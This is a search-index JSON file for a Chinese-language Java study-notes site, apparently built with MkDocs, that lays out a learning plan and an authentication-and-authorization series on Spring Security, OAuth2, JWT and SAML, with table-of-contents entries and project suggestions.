{"config":{"lang":["zh","en"],"separator":"[\\s\\-\\.]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"OpenTheDoor \u6280\u672f\u77e5\u8bc6\u5e93","text":"<p>\ud83d\udcd6 \u7cfb\u7edf\u6027\u5b66\u4e60 \u00b7 \u6301\u7eed\u79ef\u7d2f \u00b7 \u592f\u5b9e\u57fa\u7840 \u00b7 \u9762\u5411\u5b9e\u6218</p>"},{"location":"#_1","title":"\ud83d\udc4b \u5173\u4e8e\u8fd9\u4e2a\u77e5\u8bc6\u5e93","text":"<p>\u8fd9\u662f\u4e00\u4e2a**\u957f\u671f\u7ef4\u62a4\u7684\u6280\u672f\u5b66\u4e60\u7b14\u8bb0\u5e93**\uff0c\u8bb0\u5f55\u4e86\u6211\u5728\u6280\u672f\u5b66\u4e60\u9053\u8def\u4e0a\u7684\u70b9\u6ef4\u79ef\u7d2f\u3002</p>"},{"location":"#_2","title":"\ud83d\udca1 \u521b\u5efa\u521d\u8877","text":"<ul> <li>\ud83c\udfaf \u7cfb\u7edf\u5316\u5b66\u4e60\uff1a\u544a\u522b\u788e\u7247\u5316\uff0c\u6784\u5efa\u5b8c\u6574\u7684\u77e5\u8bc6\u4f53\u7cfb</li> <li>\ud83d\udcdd \u6df1\u5ea6\u7406\u89e3\uff1a\u4e0d\u53ea\u8bb0\u5f55 API\uff0c\u66f4\u8981\u7406\u89e3\u80cc\u540e\u7684\u539f\u7406</li> <li>\ud83d\udcbc \u9762\u5411\u5b9e\u6218\uff1a\u7ed3\u5408\u771f\u5b9e\u9879\u76ee\u7ecf\u9a8c\u548c\u9762\u8bd5\u9ad8\u9891\u95ee\u9898</li> <li>\ud83d\udd04 \u6301\u7eed\u79ef\u7d2f\uff1a\u5b66\u4e60\u662f\u4e00\u4e2a\u957f\u671f\u8fc7\u7a0b\uff0c\u8fd9\u91cc\u8bb0\u5f55\u6bcf\u4e00\u6b65\u6210\u957f</li> </ul>"},{"location":"#_3","title":"\ud83d\ude80 \u5b66\u4e60\u65b9\u6cd5","text":"<p>\u6bcf\u4e2a\u77e5\u8bc6\u70b9\u90fd\u6309\u7167 \"\u6982\u5ff5 \u2192 \u539f\u7406 \u2192 \u5b9e\u8df5 \u2192 \u603b\u7ed3\" \u7684\u8def\u5f84\u6df1\u5165\u5b66\u4e60\uff0c\u914d\u6709\uff1a - \u2705 \u8be6\u7ec6\u7684\u4e2d\u82f1\u6587\u53cc\u8bed\u6ce8\u91ca - \u2705 \u5b8c\u6574\u53ef\u8fd0\u884c\u7684\u4ee3\u7801\u793a\u4f8b - \u2705 \u771f\u5b9e\u9879\u76ee\u573a\u666f\u5e94\u7528 - \u2705 \u5e38\u89c1\u9762\u8bd5\u95ee\u9898\u89e3\u6790</p>"},{"location":"#_4","title":"\ud83d\udcda \u77e5\u8bc6\u4f53\u7cfb","text":""},{"location":"#new","title":"\ud83d\udd10 \u8ba4\u8bc1\u6388\u6743\u4e13\u9898 <code>NEW</code>","text":"<p>\u5b66\u4e60\u65f6\u95f4\uff1a2025\u5e7410\u6708 \u5b8c\u6210\u5ea6\uff1a\u2705 \u5df2\u5b8c\u6210\u6838\u5fc3\u5185\u5bb9</p> <p>\u6df1\u5165\u5b66\u4e60 Web \u5e94\u7528\u8ba4\u8bc1\u6388\u6743\u7684\u6838\u5fc3\u6982\u5ff5\u3001\u4e3b\u6d41\u534f\u8bae\u6807\u51c6\u548c Spring Security \u5b9e\u6218\u5e94\u7528\u3002</p> \ud83d\udcd6 \u67e5\u770b\u5168\u90e8\u6587\u7ae0\uff088\u7bc7\uff09  1. [\u8ba4\u8bc1\u6388\u6743\u57fa\u7840](auth/01-\u8ba4\u8bc1\u6388\u6743\u57fa\u7840.md) - \u6838\u5fc3\u6982\u5ff5\u3001\u8ba4\u8bc1\u65b9\u5f0f\u3001\u6388\u6743\u6a21\u578b 2. [\u8ba4\u8bc1\u534f\u8bae\u4e0e\u6807\u51c6](auth/02-\u8ba4\u8bc1\u534f\u8bae\u4e0e\u6807\u51c6.md) - OAuth 2.0\u3001OpenID Connect\u3001SAML\u3001JWT 3. [Java\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4](auth/03-Java\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4.md) - Spring Security vs Shiro vs Apache CXF 4. [SpringSecurity\u6838\u5fc3\u67b6\u6784](auth/04-SpringSecurity\u6838\u5fc3\u67b6\u6784.md) - \u67b6\u6784\u8bbe\u8ba1\u3001\u6838\u5fc3\u7ec4\u4ef6\u3001\u8ba4\u8bc1\u6d41\u7a0b 5. [SpringSecurity\u5b9e\u6218\u914d\u7f6e](auth/05-SpringSecurity\u5b9e\u6218\u914d\u7f6e.md) - \u914d\u7f6e\u65b9\u5f0f\u3001\u6700\u4f73\u5b9e\u8df5 6. [SpringSecurity-OAuth2](auth/06-SpringSecurity-OAuth2.md) - OAuth2 \u6574\u5408\u4e0e\u5b9e\u73b0 7. [\u4ee3\u7801\u793a\u4f8b\u96c6](auth/07-\u4ee3\u7801\u793a\u4f8b\u96c6.md) - \u5b8c\u6574\u53ef\u8fd0\u884c\u7684\u793a\u4f8b\u4ee3\u7801 8. [\u9ad8\u7ea7\u4e3b\u9898\u4e0e\u6700\u4f73\u5b9e\u8df5](auth/08-\u9ad8\u7ea7\u4e3b\u9898\u4e0e\u6700\u4f73\u5b9e\u8df5.md) - \u5b89\u5168\u52a0\u56fa\u3001\u6027\u80fd\u4f18\u5316\u3001\u751f\u4ea7\u5b9e\u8df5   <p>\u6838\u5fc3\u6536\u83b7\uff1a - \u2705 \u638c\u63e1\u8ba4\u8bc1\u6388\u6743\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5e38\u89c1\u6a21\u578b - \u2705 \u7406\u89e3 OAuth 2.0\u3001JWT \u7b49\u4e3b\u6d41\u534f\u8bae\u7684\u5de5\u4f5c\u539f\u7406 - \u2705 \u719f\u7ec3\u4f7f\u7528 Spring Security \u6784\u5efa\u4f01\u4e1a\u7ea7\u5b89\u5168\u65b9\u6848</p>"},{"location":"#_5","title":"\ud83d\udccb \u5b66\u4e60\u8ba1\u5212","text":""},{"location":"#_6","title":"\ud83d\udd25 \u8fdb\u884c\u4e2d","text":"<ul> <li>\ud83d\udd10 \u8ba4\u8bc1\u6388\u6743\u4e13\u9898 - \u5df2\u5b8c\u6210</li> </ul>"},{"location":"#_7","title":"\ud83d\udcc5 \u8fd1\u671f\u8ba1\u5212","text":"<ul> <li>\u2615 Java \u6838\u5fc3\u57fa\u7840</li> <li>\u96c6\u5408\u6846\u67b6\u6e90\u7801\u5206\u6790</li> <li>\u5e76\u53d1\u7f16\u7a0b\u6df1\u5165\uff08\u7ebf\u7a0b\u3001\u9501\u3001\u5e76\u53d1\u5de5\u5177\u7c7b\uff09</li> <li> <p>JVM \u539f\u7406\u4e0e\u8c03\u4f18</p> </li> <li> <p>\ud83c\udf31 Spring \u6846\u67b6\u6df1\u5165</p> </li> <li>Spring Core\uff08IoC\u3001AOP\u3001\u4e8b\u4ef6\u673a\u5236\uff09</li> <li>Spring Boot \u81ea\u52a8\u914d\u7f6e\u539f\u7406</li> <li>Spring Cloud \u5fae\u670d\u52a1\u5b9e\u6218</li> </ul>"},{"location":"#_8","title":"\ud83c\udfaf \u957f\u671f\u89c4\u5212","text":"<ul> <li>\u2601\ufe0f \u4e91\u539f\u751f\u6280\u672f\u6808</li> <li>Docker \u5bb9\u5668\u5316\u5b9e\u8df5</li> <li>Kubernetes \u670d\u52a1\u7f16\u6392</li> <li> <p>Nomad \u8c03\u5ea6\u7cfb\u7edf\uff08\u7ed3\u5408\u5f53\u524d\u9879\u76ee\uff09</p> </li> <li> <p>\ud83d\uddc4\ufe0f \u6570\u636e\u5e93\u4e0e\u4e2d\u95f4\u4ef6</p> </li> <li>MySQL \u539f\u7406\u4e0e\u4f18\u5316</li> <li>Redis \u6df1\u5165\u5e94\u7528</li> <li> <p>Kafka/RabbitMQ \u6d88\u606f\u961f\u5217</p> </li> <li> <p>\ud83c\udfd7\ufe0f \u7cfb\u7edf\u8bbe\u8ba1\u4e0e\u67b6\u6784</p> </li> <li>\u5fae\u670d\u52a1\u67b6\u6784\u8bbe\u8ba1</li> <li>\u5206\u5e03\u5f0f\u7cfb\u7edf\u7406\u8bba</li> <li> <p>\u9ad8\u5e76\u53d1\u7cfb\u7edf\u8bbe\u8ba1</p> </li> <li> <p>\ud83d\udcca \u7b97\u6cd5\u4e0e\u6570\u636e\u7ed3\u6784</p> </li> <li>LeetCode \u5237\u9898\u7b14\u8bb0</li> <li>\u5e38\u89c1\u7b97\u6cd5\u6a21\u677f\u603b\u7ed3</li> </ul>"},{"location":"#_9","title":"\u6280\u672f\u7279\u70b9","text":"<ul> <li>\u2601\ufe0f \u5bf9 Docker \u548c\u4e91\u539f\u751f\u6280\u672f\u6709\u6df1\u5165\u7406\u89e3</li> <li>\ud83d\udd27 \u719f\u6089\u5fae\u670d\u52a1\u67b6\u6784\u548c\u5206\u5e03\u5f0f\u7cfb\u7edf</li> <li>\ud83d\udcc8 \u6b63\u5728\u7cfb\u7edf\u6027\u8865\u9f50\u6838\u5fc3\u7f16\u7a0b\u80fd\u529b</li> </ul>"},{"location":"#_10","title":"\u5b66\u4e60\u76ee\u6807","text":"<ul> <li>\ud83c\udfaf \u63d0\u5347\u7f16\u7a0b\u57fa\u7840\u80fd\u529b\uff1a\u6df1\u5165\u7406\u89e3 Java \u6838\u5fc3\u539f\u7406</li> <li>\ud83c\udfd7\ufe0f \u5efa\u7acb\u67b6\u6784\u601d\u7ef4\uff1a\u4ece\u4ee3\u7801\u5230\u7cfb\u7edf\u8bbe\u8ba1\u7684\u5168\u9762\u63d0\u5347</li> <li>\ud83d\udcbc \u9762\u8bd5\u51c6\u5907\uff1a\u8865\u9f50\u77e5\u8bc6\u77ed\u677f\uff0c\u63d0\u9ad8\u7ade\u4e89\u529b</li> <li>\ud83d\ude80 \u9879\u76ee\u5b9e\u6218\uff1a\u7406\u8bba\u8054\u7cfb\u5b9e\u9645\uff0c\u89e3\u51b3\u771f\u5b9e\u95ee\u9898</li> </ul>"},{"location":"#_11","title":"\ud83c\udfaf \u5b66\u4e60\u7279\u8272","text":""},{"location":"#_12","title":"\ud83d\udcdd \u5185\u5bb9\u8d28\u91cf","text":"<ul> <li>\u539f\u7406\u4f18\u5148\uff1a\u4e0d\u53ea\u8bb0\u5f55 API \u7528\u6cd5\uff0c\u66f4\u8981\u7406\u89e3\u4e3a\u4ec0\u4e48\u8fd9\u6837\u8bbe\u8ba1</li> <li>\u4ee3\u7801\u6ce8\u91ca\uff1a\u6240\u6709\u793a\u4f8b\u90fd\u6709\u8be6\u7ec6\u7684\u4e2d\u82f1\u6587\u53cc\u8bed\u6ce8\u91ca</li> <li>\u573a\u666f\u9a71\u52a8\uff1a\u7ed3\u5408\u771f\u5b9e\u9879\u76ee\u573a\u666f\u548c\u5e38\u89c1\u4e1a\u52a1\u9700\u6c42</li> <li>\u9762\u8bd5\u5bfc\u5411\uff1a\u6807\u6ce8\u9ad8\u9891\u9762\u8bd5\u95ee\u9898\u548c\u6807\u51c6\u56de\u7b54\u601d\u8def</li> </ul>"},{"location":"#_13","title":"\ud83d\udee0\ufe0f \u5b9e\u8df5\u5bfc\u5411","text":"<ul> <li>\u5b8c\u6574\u4ee3\u7801\uff1a\u63d0\u4f9b\u53ef\u76f4\u63a5\u8fd0\u884c\u7684\u5b8c\u6574\u793a\u4f8b\uff0c\u4e0d\u662f\u4ee3\u7801\u7247\u6bb5</li> <li>\u6700\u4f73\u5b9e\u8df5\uff1a\u5f3a\u8c03\u751f\u4ea7\u73af\u5883\u7684\u4ee3\u7801\u8d28\u91cf\u548c\u5de5\u7a0b\u5316\u601d\u7ef4</li> <li>\u95ee\u9898\u89e3\u51b3\uff1a\u8bb0\u5f55\u5b9e\u9645\u9047\u5230\u7684\u95ee\u9898\u548c\u89e3\u51b3\u65b9\u6848</li> <li>\u6301\u7eed\u66f4\u65b0\uff1a\u968f\u7740\u7406\u89e3\u6df1\u5165\u4e0d\u65ad\u5b8c\u5584\u548c\u8865\u5145</li> </ul>"},{"location":"#_14","title":"\ud83d\udcda \u77e5\u8bc6\u7ec4\u7ec7","text":"<p>\u6bcf\u4e2a\u4e3b\u9898\u90fd\u6309\u7167\u7edf\u4e00\u7684\u7ed3\u6784\u7ec4\u7ec7\uff1a <pre><code>1. \u6982\u5ff5\u5b9a\u4e49 (What) - \u8fd9\u662f\u4ec0\u4e48\n2. \u6838\u5fc3\u539f\u7406 (Why) - \u4e3a\u4ec0\u4e48\u9700\u8981/\u5de5\u4f5c\u539f\u7406\n3. \u4f7f\u7528\u573a\u666f (When) - \u4ec0\u4e48\u65f6\u5019\u7528\n4. \u5b9e\u8df5\u793a\u4f8b (How) - \u600e\u4e48\u4f7f\u7528\n5. \u6700\u4f73\u5b9e\u8df5 (Best Practice) - \u751f\u4ea7\u73af\u5883\u5efa\u8bae\n6. \u9762\u8bd5\u8981\u70b9 (Interview Tips) - \u5e38\u89c1\u95ee\u9898\u89e3\u6790\n</code></pre></p>"},{"location":"#_15","title":"\ud83d\ude80 \u5982\u4f55\u4f7f\u7528","text":""},{"location":"#_16","title":"\ud83d\udcd6 \u5728\u7ebf\u9605\u8bfb\uff08\u63a8\u8350\uff09","text":"<p>\u8bbf\u95ee GitHub Pages \u5728\u7ebf\u9605\u8bfb\uff0c\u83b7\u5f97\u6700\u4f73\u4f53\u9a8c\uff1a - \ud83c\udfa8 \u73b0\u4ee3\u5316\u7684 Material Design \u4e3b\u9898 - \ud83d\udd0d \u5f3a\u5927\u7684\u5168\u6587\u641c\u7d22\u529f\u80fd - \ud83c\udf19 \u652f\u6301\u6df1\u8272/\u6d45\u8272\u6a21\u5f0f\u5207\u6362 - \ud83d\udcf1 \u54cd\u5e94\u5f0f\u8bbe\u8ba1\uff0c\u652f\u6301\u79fb\u52a8\u7aef</p>"},{"location":"#_17","title":"\ud83d\udcbb \u672c\u5730\u9605\u8bfb","text":"<p>\u4f7f\u7528 Obsidian \u6253\u5f00\u672c\u4ed3\u5e93\uff1a - \ud83d\udd17 \u652f\u6301\u53cc\u5411\u94fe\u63a5\u548c\u5173\u7cfb\u56fe\u8c31 - \ud83d\udcdd \u5b9e\u65f6\u9884\u89c8\u548c\u7f16\u8f91 - \ud83c\udfaf \u5f3a\u5927\u7684\u7b14\u8bb0\u7ba1\u7406\u529f\u80fd</p>"},{"location":"#_18","title":"\ud83e\udd1d \u4ea4\u6d41\u4e0e\u53cd\u9988","text":"<ul> <li>\ud83d\udcac \u53d1\u73b0\u9519\u8bef\u6216\u6709\u5efa\u8bae\uff1f\u6b22\u8fce\u63d0 Issues</li> <li>\u2b50 \u89c9\u5f97\u6709\u5e2e\u52a9\uff1f\u7ed9\u4e2a Star \u9f13\u52b1\u4e00\u4e0b</li> <li>\ud83d\udd00 \u60f3\u8981\u8865\u5145\u5185\u5bb9\uff1f\u6b22\u8fce\u63d0 Pull Request</li> </ul>"},{"location":"#_19","title":"\ud83d\udcde \u5173\u4e8e\u6211","text":"<ul> <li>\ud83d\udcbc 7\u5e74 Java \u5f00\u53d1\u5de5\u7a0b\u5e08\uff0c\u5173\u6ce8\u4e91\u539f\u751f\u548c\u5fae\u670d\u52a1</li> <li>\ud83c\udfaf \u6301\u7eed\u5b66\u4e60\u8005\uff0c\u76f8\u4fe1\u7cfb\u7edf\u5316\u79ef\u7d2f\u7684\u529b\u91cf</li> <li>\ud83d\udce7 GitHub: @zhangzimingmmz</li> </ul>   **\ud83d\udcaa \u6bcf\u5929\u8fdb\u6b65\u4e00\u70b9\u70b9\uff0c\u6301\u7eed\u5b66\u4e60\uff0c\u4e0d\u65ad\u6210\u957f\uff01**  *\"\u5b66\u4e60\u4e0d\u662f\u4e3a\u4e86\u5e94\u4ed8\u9762\u8bd5\uff0c\u800c\u662f\u4e3a\u4e86\u6210\u4e3a\u66f4\u597d\u7684\u5de5\u7a0b\u5e08\"*  \u2b50 \u5982\u679c\u8fd9\u4e2a\u77e5\u8bc6\u5e93\u5bf9\u4f60\u6709\u5e2e\u52a9\uff0c\u6b22\u8fce Star \u652f\u6301   \ud83d\udd04 \u6301\u7eed\u66f4\u65b0\u4e2d... | \u6700\u540e\u66f4\u65b0\uff1a2025\u5e7410\u6708"},{"location":"auth/","title":"\u8ba4\u8bc1\u6388\u6743\u5b66\u4e60\u6587\u6863\u4f53\u7cfb","text":"<p>\u4e00\u5957\u5b8c\u6574\u7684Java\u8ba4\u8bc1\u6388\u6743\u5b66\u4e60\u8d44\u6599\uff0c\u4ece\u57fa\u7840\u6982\u5ff5\u5230\u9ad8\u7ea7\u5b9e\u8df5\uff0c\u6db5\u76d6Spring Security\u3001OAuth2\u3001JWT\u7b49\u4e3b\u6d41\u6280\u672f\u6808\u3002</p>"},{"location":"auth/#_2","title":"\ud83d\udcda \u6587\u6863\u76ee\u5f55","text":""},{"location":"auth/#_3","title":"\u57fa\u7840\u7bc7","text":""},{"location":"auth/#01-","title":"01 - \u8ba4\u8bc1\u6388\u6743\u57fa\u7840","text":"<ul> <li>\u8ba4\u8bc1\u4e0e\u6388\u6743\u7684\u6838\u5fc3\u6982\u5ff5</li> <li>\u4f1a\u8bdd\u7ba1\u7406\u673a\u5236</li> <li>\u5bc6\u7801\u5b66\u57fa\u7840\uff08\u54c8\u5e0c\u3001\u52a0\u5bc6\u3001\u7b7e\u540d\uff09</li> <li>\u5e38\u89c1\u653b\u51fb\u65b9\u5f0f\u4e0e\u9632\u62a4\uff08CSRF\u3001XSS\u3001SQL\u6ce8\u5165\uff09</li> <li>\u5b89\u5168\u6700\u4f73\u5b9e\u8df5</li> </ul>"},{"location":"auth/#02-","title":"02 - \u8ba4\u8bc1\u534f\u8bae\u4e0e\u6807\u51c6","text":"<ul> <li>Cookie/Session\u673a\u5236\u8be6\u89e3</li> <li>Token\u8ba4\u8bc1\uff08JWT\u3001JWE\u3001JWS\uff09</li> <li>OAuth 2.0\u534f\u8bae\u5b8c\u6574\u6307\u5357</li> <li>OpenID Connect (OIDC)</li> <li>SAML 2.0</li> <li>\u5355\u70b9\u767b\u5f55(SSO)\u5b9e\u73b0</li> </ul>"},{"location":"auth/#_4","title":"\u6846\u67b6\u7bc7","text":""},{"location":"auth/#03-java","title":"03 - Java\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4","text":"<ul> <li>Spring Security\uff08\u6700\u5168\u9762\uff09</li> <li>Apache Shiro\uff08\u8f7b\u91cf\u7ea7\uff09</li> <li>JAAS\uff08Java\u6807\u51c6\uff09</li> <li>Keycloak\uff08IAM\u5e73\u53f0\uff09</li> <li>Pac4j\uff08\u591a\u534f\u8bae\uff09</li> <li>\u6846\u67b6\u9009\u578b\u51b3\u7b56\u6811</li> </ul>"},{"location":"auth/#spring-security","title":"Spring Security\u6df1\u5165\u7bc7","text":""},{"location":"auth/#04-spring-security","title":"04 - Spring Security\u6838\u5fc3\u67b6\u6784","text":"<ul> <li>\u8fc7\u6ee4\u5668\u94fe\u673a\u5236</li> <li>\u8ba4\u8bc1\u67b6\u6784\uff08AuthenticationManager\u3001Provider\uff09</li> <li>\u6388\u6743\u67b6\u6784\uff08AccessDecisionManager\u3001Voter\uff09</li> <li>\u6838\u5fc3\u7ec4\u4ef6\u8be6\u89e3</li> <li>Security Context\u7ba1\u7406</li> <li>\u81ea\u5b9a\u4e49\u6269\u5c55\u70b9</li> </ul>"},{"location":"auth/#05-spring-security","title":"05 - Spring Security\u5b9e\u6218\u914d\u7f6e","text":"<ul> <li>\u57fa\u7840\u914d\u7f6e\u4e0e\u751f\u4ea7\u73af\u5883\u914d\u7f6e</li> <li>\u8868\u5355\u767b\u5f55\uff08\u6210\u529f/\u5931\u8d25\u5904\u7406\u5668\uff09</li> <li>HTTP Basic\u8ba4\u8bc1</li> <li>Remember-Me\u529f\u80fd</li> <li>\u4f1a\u8bdd\u7ba1\u7406\u4e0e\u5e76\u53d1\u63a7\u5236</li> <li>CSRF\u9632\u62a4\u914d\u7f6e</li> <li>\u65b9\u6cd5\u7ea7\u5b89\u5168</li> </ul>"},{"location":"auth/#06-spring-security-oauth2","title":"06 - Spring Security OAuth2\u96c6\u6210","text":"<ul> <li>\u6388\u6743\u670d\u52a1\u5668\u914d\u7f6e\uff08Spring Authorization Server\uff09</li> <li>\u8d44\u6e90\u670d\u52a1\u5668\u914d\u7f6e</li> <li>OAuth2\u5ba2\u6237\u7aef\u914d\u7f6e</li> <li>JWT Token\u751f\u6210\u4e0e\u9a8c\u8bc1\uff08RS256/HS256\uff09</li> <li>Token\u81ea\u5b9a\u4e49\u4e0e\u589e\u5f3a</li> <li>\u5fae\u670d\u52a1OAuth2\u67b6\u6784</li> </ul>"},{"location":"auth/#_5","title":"\u5b9e\u6218\u7bc7","text":""},{"location":"auth/#07-","title":"07 - \u4ee3\u7801\u793a\u4f8b\u96c6","text":"<ul> <li>\u57fa\u7840\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\uff08\u5b8c\u6574\u9879\u76ee\uff09</li> <li>JWT Token\u5b9e\u73b0\uff08Access Token + Refresh Token\uff09</li> <li>OAuth2\u6388\u6743\u7801\u6a21\u5f0f\u793a\u4f8b</li> <li>\u5fae\u670d\u52a1\u8ba4\u8bc1\u67b6\u6784</li> <li>\u524d\u540e\u7aef\u5206\u79bb\u8ba4\u8bc1\u65b9\u6848</li> <li>\u524d\u7aef\u96c6\u6210\u793a\u4f8b\uff08JavaScript\uff09</li> </ul>"},{"location":"auth/#08-","title":"08 - \u9ad8\u7ea7\u4e3b\u9898\u4e0e\u6700\u4f73\u5b9e\u8df5","text":"<ul> <li>\u591a\u79df\u6237\u8ba4\u8bc1\uff08\u6570\u636e\u9694\u79bb\u3001\u79df\u6237\u8bc6\u522b\uff09</li> <li>\u5206\u5e03\u5f0f\u4f1a\u8bdd\u7ba1\u7406\uff08Redis Session\uff09</li> <li>\u5fae\u670d\u52a1\u5b89\u5168\u67b6\u6784\uff08\u7f51\u5173\u8ba4\u8bc1\u3001\u670d\u52a1\u95f4\u8c03\u7528\uff09</li> <li>\u6027\u80fd\u4f18\u5316\u7b56\u7565\uff08\u7f13\u5b58\u3001\u6279\u91cf\u5904\u7406\uff09</li> <li>\u5ba1\u8ba1\u65e5\u5fd7\u4e0e\u76d1\u63a7</li> <li>\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\u6c47\u603b</li> </ul>"},{"location":"auth/#_6","title":"\ud83d\ude80 \u5b66\u4e60\u8def\u5f84","text":""},{"location":"auth/#1-2","title":"\u521d\u7ea7\u9636\u6bb5\uff081-2\u5468\uff09","text":"<ol> <li>\u9605\u8bfb \u8ba4\u8bc1\u6388\u6743\u57fa\u7840\uff0c\u7406\u89e3\u6838\u5fc3\u6982\u5ff5</li> <li>\u9605\u8bfb \u8ba4\u8bc1\u534f\u8bae\u4e0e\u6807\u51c6\uff0c\u4e86\u89e3\u4e3b\u6d41\u534f\u8bae</li> <li>\u5b9e\u8df5\uff1a\u642d\u5efa\u7b80\u5355\u7684\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\u7cfb\u7edf</li> </ol>"},{"location":"auth/#2-3","title":"\u4e2d\u7ea7\u9636\u6bb5\uff082-3\u5468\uff09","text":"<ol> <li>\u9605\u8bfb Java\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4\uff0c\u9009\u62e9\u9002\u5408\u7684\u6846\u67b6</li> <li>\u6df1\u5165\u5b66\u4e60 Spring Security\u6838\u5fc3\u67b6\u6784</li> <li>\u5b9e\u8df5 Spring Security\u5b9e\u6218\u914d\u7f6e</li> <li>\u5b9e\u8df5\uff1a\u4f7f\u7528Spring Security\u6784\u5efa\u5b8c\u6574\u7684\u8ba4\u8bc1\u6388\u6743\u7cfb\u7edf</li> </ol>"},{"location":"auth/#3-4","title":"\u9ad8\u7ea7\u9636\u6bb5\uff083-4\u5468\uff09","text":"<ol> <li>\u5b66\u4e60 Spring Security OAuth2\u96c6\u6210</li> <li>\u53c2\u8003 \u4ee3\u7801\u793a\u4f8b\u96c6 \u5b9e\u73b0JWT\u3001OAuth2</li> <li>\u7814\u7a76 \u9ad8\u7ea7\u4e3b\u9898\u4e0e\u6700\u4f73\u5b9e\u8df5</li> <li>\u5b9e\u8df5\uff1a\u6784\u5efa\u5fae\u670d\u52a1\u8ba4\u8bc1\u67b6\u6784\u3001\u5b9e\u73b0\u591a\u79df\u6237\u7cfb\u7edf</li> </ol>"},{"location":"auth/#_7","title":"\ud83d\udca1 \u5feb\u901f\u67e5\u627e","text":""},{"location":"auth/#_8","title":"\u6309\u9700\u6c42\u67e5\u627e","text":"\u9700\u6c42 \u63a8\u8350\u7ae0\u8282 \u4e86\u89e3\u57fa\u7840\u6982\u5ff5 01-\u57fa\u7840 \u5b66\u4e60JWT 02-\u534f\u8bae \u2192 07-\u793a\u4f8b \u5b66\u4e60OAuth2 02-\u534f\u8bae \u2192 06-OAuth2 \u9009\u62e9\u6846\u67b6 03-\u6846\u67b6\u5bf9\u6bd4 Spring Security\u5165\u95e8 04-\u67b6\u6784 \u2192 05-\u914d\u7f6e \u5b9e\u6218\u4ee3\u7801 07-\u4ee3\u7801\u793a\u4f8b\u96c6 \u5fae\u670d\u52a1\u5b89\u5168 08-\u9ad8\u7ea7\u4e3b\u9898 \u6027\u80fd\u4f18\u5316 08-\u9ad8\u7ea7\u4e3b\u9898 \u5b89\u5168\u5ba1\u8ba1 08-\u9ad8\u7ea7\u4e3b\u9898"},{"location":"auth/#_9","title":"\u6309\u6280\u672f\u6808\u67e5\u627e","text":"\u6280\u672f\u6808 \u76f8\u5173\u7ae0\u8282 Spring Boot 03, 04, 05, 06, 07 JWT 02, 06, 07 OAuth 2.0 02, 06 \u5fae\u670d\u52a1 06, 07, 08 Redis 01, 08"},{"location":"auth/#_10","title":"\ud83c\udfaf \u6838\u5fc3\u77e5\u8bc6\u70b9\u901f\u67e5","text":""},{"location":"auth/#_11","title":"\u8ba4\u8bc1\u65b9\u5f0f\u5bf9\u6bd4","text":"\u65b9\u5f0f \u9002\u7528\u573a\u666f \u4f18\u70b9 \u7f3a\u70b9 Session/Cookie \u4f20\u7edfWeb\u5e94\u7528 \u7b80\u5355\u3001\u670d\u52a1\u5668\u63a7\u5236\u5f3a \u4e0d\u9002\u5408\u5206\u5e03\u5f0f JWT Token \u524d\u540e\u7aef\u5206\u79bb\u3001\u5fae\u670d\u52a1 \u65e0\u72b6\u6001\u3001\u6613\u6269\u5c55 \u65e0\u6cd5\u4e3b\u52a8\u540a\u9500 OAuth2 \u7b2c\u4e09\u65b9\u767b\u5f55\u3001\u5f00\u653eAPI \u6807\u51c6\u5316\u3001\u5b89\u5168 \u5b9e\u73b0\u590d\u6742 SAML \u4f01\u4e1aSSO \u6210\u719f\u3001\u529f\u80fd\u5168 \u91cd\u91cf\u7ea7"},{"location":"auth/#spring-security_1","title":"Spring Security\u6838\u5fc3\u7ec4\u4ef6","text":"<pre><code>SecurityFilterChain\n    \u251c\u2500 SecurityContextPersistenceFilter\n    \u251c\u2500 UsernamePasswordAuthenticationFilter\n    \u2502       \u2514\u2500 AuthenticationManager\n    \u2502               \u2514\u2500 AuthenticationProvider\n    \u2502                       \u2514\u2500 UserDetailsService\n    \u2514\u2500 FilterSecurityInterceptor\n            \u2514\u2500 AccessDecisionManager\n                    \u2514\u2500 AccessDecisionVoter\n</code></pre>"},{"location":"auth/#oauth2","title":"OAuth2\u6388\u6743\u6a21\u5f0f","text":"<ol> <li>\u6388\u6743\u7801\u6a21\u5f0f\uff08Authorization Code\uff09 - \u6700\u5b89\u5168\uff0c\u9002\u7528\u4e8e\u6709\u540e\u7aef\u7684\u5e94\u7528</li> <li>\u9690\u5f0f\u6a21\u5f0f\uff08Implicit\uff09 - \u5df2\u5f03\u7528\uff0c\u4e0d\u63a8\u8350</li> <li>\u5bc6\u7801\u6a21\u5f0f\uff08Password\uff09 - \u9ad8\u5ea6\u4fe1\u4efb\u7684\u5e94\u7528</li> <li>\u5ba2\u6237\u7aef\u6a21\u5f0f\uff08Client Credentials\uff09 - \u670d\u52a1\u5668\u95f4\u8c03\u7528</li> </ol>"},{"location":"auth/#_12","title":"\ud83d\udd27 \u5b9e\u8df5\u9879\u76ee\u5efa\u8bae","text":""},{"location":"auth/#_13","title":"\u521d\u7ea7\u9879\u76ee","text":"<ul> <li> \u57fa\u7840\u7528\u6237\u6ce8\u518c\u767b\u5f55\u7cfb\u7edf</li> <li> Session\u7ba1\u7406\u4e0eRemember-Me\u529f\u80fd</li> <li> \u89d2\u8272\u6743\u9650\u7ba1\u7406\uff08RBAC\uff09</li> </ul>"},{"location":"auth/#_14","title":"\u4e2d\u7ea7\u9879\u76ee","text":"<ul> <li> JWT Token\u8ba4\u8bc1\u7cfb\u7edf\uff08\u542b\u5237\u65b0\u673a\u5236\uff09</li> <li> \u96c6\u6210\u7b2c\u4e09\u65b9OAuth2\u767b\u5f55\uff08GitHub\u3001Google\uff09</li> <li> \u5b9e\u73b0API\u901f\u7387\u9650\u5236\u548c\u5b89\u5168\u5ba1\u8ba1</li> </ul>"},{"location":"auth/#_15","title":"\u9ad8\u7ea7\u9879\u76ee","text":"<ul> <li> \u5fae\u670d\u52a1\u8ba4\u8bc1\u6388\u6743\u67b6\u6784\uff08Gateway + JWT\uff09</li> <li> \u591a\u79df\u6237SaaS\u5e73\u53f0\u8ba4\u8bc1\u7cfb\u7edf</li> <li> \u5b8c\u6574\u7684IAM\uff08\u8eab\u4efd\u8bbf\u95ee\u7ba1\u7406\uff09\u7cfb\u7edf</li> 